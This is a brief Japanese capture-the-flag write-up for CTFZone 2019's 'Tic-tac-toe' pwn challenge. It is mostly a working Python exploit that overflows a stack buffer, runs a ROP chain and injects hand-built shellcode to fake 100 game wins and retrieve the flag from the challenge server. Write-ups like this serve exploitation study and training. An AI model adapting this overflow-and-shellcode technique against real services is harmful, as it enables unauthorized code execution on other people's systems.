# [pwn ?pts] Tic-tac-toe - CTFZone 2019 Quals
全部無効です。
```
$ checksec -f tictactoe
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   125 Symbols     No      0               14      tictactoe
```
まるばつゲームに100回勝てば良いですが後手なので勝てません。
名前にStack Overflowがあるので、ソケット経由で頑張ってシェルコードを送り付け、シェルコードの中で本体サーバーとやりとりして100回勝つ出来レースを送って最後にフラグを貰いました。
```python
from ptrlib import *
import time

fd = 4

elf = ELF("./tictactoe")
#sock = Socket("0.0.0.0", 8889)
sock = Socket("pwn-tictactoe.ctfz.one", 8889)
rop_pop_rdi = 0x0040310b
rop_pop_rsi_r15 = 0x00403109
addr_shellcode = elf.section(".bss") + 0x400

shellcode = b'\x49\xc7\xc7\x64\x00\x00\x00'
for h, c in [(0,3), (1,4), (2,8)]:
    shellcode += b'\xb9' + p32(h)
    shellcode += b'\xba' + p32(c)
    shellcode += b'\x48\xbe' + p64(elf.symbol('session'))
    shellcode += b'\x48\xb8' + p64(elf.symbol('server_ip'))
    shellcode += b'\x48\x8b\x38'
    shellcode += b'\x49\xbc' + p64(elf.symbol('send_state'))
    shellcode += b'\x41\xff\xd4'
shellcode += b'\x49\xff\xcf'
shellcode += b'\x4d\x85\xff'
shellcode += b'\x0f\x85\x6a\xff\xff\xff'
shellcode += b'\xc3'
shellcode += b'\x00' * (0x102 - len(shellcode))

time.sleep(1)
payload = b'A' * 0x58
payload += p64(rop_pop_rdi)
payload += p64(elf.section('.bss') + 0x100)
payload += p64(elf.symbol('reg_user'))
payload += p64(elf.symbol('send_flag'))
payload += p64(rop_pop_rdi)
payload += p64(fd)
payload += p64(rop_pop_rsi_r15)
payload += p64(addr_shellcode)
payload += p64(0xdeadbeef)
payload += p64(elf.symbol('recv_all'))
payload += p64(addr_shellcode)
payload += p64(elf.symbol('send_flag'))
payload += b'A' * (0x800 - len(payload))
sock.sendafter(": ", payload)
time.sleep(1)
sock.send(shellcode)
time.sleep(3)

sock.interactive()
```

# 感想
hack.luのを思い出した。あっちの方が面白かったけど。